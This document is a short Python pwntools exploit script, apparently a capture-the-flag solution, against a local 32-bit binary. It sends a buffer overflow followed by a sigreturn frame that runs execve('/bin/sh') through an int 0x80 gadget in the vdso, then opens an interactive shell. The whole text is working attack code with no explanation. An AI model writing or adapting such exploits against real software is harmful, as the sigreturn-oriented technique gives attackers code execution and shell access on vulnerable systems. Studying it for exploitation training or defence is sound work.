#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['lxterminal', '-e']
context.arch = 'i386'

bin_sh_addr = 0x804a020
bss_addr = 0x804a030

p = process('./main')

#gdb.attach(p)

vdso_addr = 0xf7fd8000
print 'Try vdso %s' % hex(vdso_addr)

payload = 'A' * 0x110
frame = SigreturnFrame(kernel="i386")
frame.eax = constants.SYS_execve
frame.ebx = bin_sh_addr
frame.eip = vdso_addr + 0xb76 # address of int 0x80
frame.esp = bss_addr
frame.ebp = bss_addr
frame.gs = 0x63
frame.cs = 0x23
frame.es = 0x2b
frame.ds = 0x2b
frame.ss = 0x2b
ret_addr = vdso_addr + 0xb71 # address of sigreturn
payload += p32(ret_addr) + str(frame)
p.recvuntil('> ')
p.sendline(payload)

p.sendline('echo pwned')
data = p.recvuntil('pwned')
if data != 'pwned':
    raise Exception, 'Failed'

p.interactive()
